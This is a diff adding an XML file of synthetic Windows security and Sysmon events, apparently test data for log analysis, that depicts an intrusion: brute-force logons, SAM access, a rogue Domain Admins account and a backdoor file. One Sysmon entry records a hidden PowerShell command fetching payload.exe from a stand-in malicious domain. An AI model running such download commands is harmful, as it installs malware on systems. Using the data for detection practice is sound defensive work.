@@ -1,0 +1,299 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4624</EventID>
+    <Level>4</Level>
+    <TimeCreated SystemTime="2025-10-20T08:05:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-5-18</Data>
+    <Data Name="SubjectUserName">-</Data>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="IpAddress">192.168.1.5</Data>
+    <Data Name="LogonType">2</Data>
+    <Data Name="Status">0x0</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4625</EventID>
+    <Level>2</Level>
+    <TimeCreated SystemTime="2025-10-20T08:15:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-0-0</Data>
+    <Data Name="SubjectUserName">-</Data>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="IpAddress">203.0.113.45</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="Status">0xC000006D</Data>
+    <Data Name="SubStatus">0xC0000064</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4625</EventID>
+    <Level>2</Level>
+    <TimeCreated SystemTime="2025-10-20T08:15:10Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-0-0</Data>
+    <Data Name="SubjectUserName">-</Data>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="IpAddress">203.0.113.45</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="Status">0xC000006D</Data>
+    <Data Name="SubStatus">0xC0000064</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4625</EventID>
+    <Level>2</Level>
+    <TimeCreated SystemTime="2025-10-20T08:15:20Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-0-0</Data>
+    <Data Name="SubjectUserName">-</Data>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="IpAddress">203.0.113.45</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="Status">0xC000006D</Data>
+    <Data Name="SubStatus">0xC0000064</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Custom-SIEM-Alert" />
+    <EventID>0</EventID>
+    <Level>1</Level>
+    <TimeCreated SystemTime="2025-10-20T08:17:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Alert">Multiple failed password attempts detected from IP 203.0.113.45</Data>
+    <Data Name="Severity">HIGH</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" />
+    <EventID>1</EventID>
+    <Level>4</Level>
+    <TimeCreated SystemTime="2025-10-20T08:25:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2025-10-20T08:25:00Z</Data>
+    <Data Name="ProcessGuid">{11111111-2222-3333-4444-555555555555}</Data>
+    <Data Name="ProcessId">4520</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -nop -w hidden -c "Invoke-WebRequest http://malicious-domain.com/payload.exe -OutFile C:\Temp\payload.exe"</Data>
+    <Data Name="User">CORP\svc_monitor</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" />
+    <EventID>3</EventID>
+    <Level>4</Level>
+    <TimeCreated SystemTime="2025-10-20T08:26:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2025-10-20T08:26:00Z</Data>
+    <Data Name="SourceIp">10.0.0.5</Data>
+    <Data Name="SourcePort">49320</Data>
+    <Data Name="DestinationIp">212.33.77.12</Data>
+    <Data Name="DestinationPort">8080</Data>
+    <Data Name="Protocol">TCP</Data>
+    <Data Name="Bytes">7340032</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4670</EventID>
+    <Level>4</Level>
+    <TimeCreated SystemTime="2025-10-20T08:30:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-5-21-999999-1000</Data>
+    <Data Name="SubjectUserName">CORP\unknown_user</Data>
+    <Data Name="ObjectName">C:\Windows\System32\config\SAM</Data>
+    <Data Name="AccessMask">0x2</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Custom-SIEM-Alert" />
+    <EventID>0</EventID>
+    <Level>1</Level>
+    <TimeCreated SystemTime="2025-10-20T08:31:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Alert">Unauthorized privilege escalation detected</Data>
+    <Data Name="User">CORP\unknown_user</Data>
+    <Data Name="Command">runas /user:Administrator cmd.exe</Data>
+    <Data Name="Severity">HIGH</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4720</EventID>
+    <Level>2</Level>
+    <TimeCreated SystemTime="2025-10-20T08:32:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-5-21-999999-500</Data>
+    <Data Name="SubjectUserName">CORP\Administrator</Data>
+    <Data Name="NewAccountName">attacker</Data>
+    <Data Name="Privileges">Domain Admins</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Windows Firewall with Advanced Security" />
+    <EventID>2004</EventID>
+    <Level>3</Level>
+    <TimeCreated SystemTime="2025-10-20T08:40:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="RuleName">Default Inbound Rule</Data>
+    <Data Name="Action">Block</Data>
+    <Data Name="Protocol">TCP</Data>
+    <Data Name="RemoteAddress">45.67.89.23</Data>
+    <Data Name="RemotePort">22</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4625</EventID>
+    <Level>2</Level>
+    <TimeCreated SystemTime="2025-10-20T08:45:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-0-0</Data>
+    <Data Name="SubjectUserName">-</Data>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="IpAddress">185.43.22.11</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="Status">0xC000006D</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" />
+    <EventID>11</EventID>
+    <Level>4</Level>
+    <TimeCreated SystemTime="2025-10-20T08:55:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2025-10-20T08:55:00Z</Data>
+    <Data Name="FileName">C:\Users\Public\backdoor.ps1</Data>
+    <Data Name="EventType">FileCreate</Data>
+    <Data Name="User">CORP\svc_monitor</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Application Error" />
+    <EventID>1000</EventID>
+    <Level>3</Level>
+    <TimeCreated SystemTime="2025-10-20T09:05:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="EventName">Application Error</Data>
+    <Data Name="FaultingApplication">svchost.exe</Data>
+    <Data Name="ExceptionCode">0xC0000005</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Custom-SIEM-Alert" />
+    <EventID>0</EventID>
+    <Level>1</Level>
+    <TimeCreated SystemTime="2025-10-20T09:07:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Alert">Suspicious network connection detected</Data>
+    <Data Name="DestinationIp">212.33.77.12</Data>
+    <Data Name="DestinationPort">8080</Data>
+    <Data Name="BytesPerSec">5242880</Data>
+    <Data Name="Severity">CRITICAL</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4624</EventID>
+    <Level>4</Level>
+    <TimeCreated SystemTime="2025-10-20T09:10:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-5-21-999999-500</Data>
+    <Data Name="SubjectUserName">CORP\Administrator</Data>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="IpAddress">203.0.113.45</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="Status">0x0</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4663</EventID>
+    <Level>2</Level>
+    <TimeCreated SystemTime="2025-10-20T09:12:00Z"/>
+    <Computer>HOST01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-5-21-999999-1001</Data>
+    <Data Name="SubjectUserName">CORP\Guest</Data>
+    <Data Name="ObjectName">C:\Windows\System32\drivers\etc\hosts</Data>
+    <Data Name="AccessMask">0x2</Data>
+    <Data Name="Result">AccessDenied</Data>
+  </EventData>
+</Event>
+
+</Events>
+
+
+
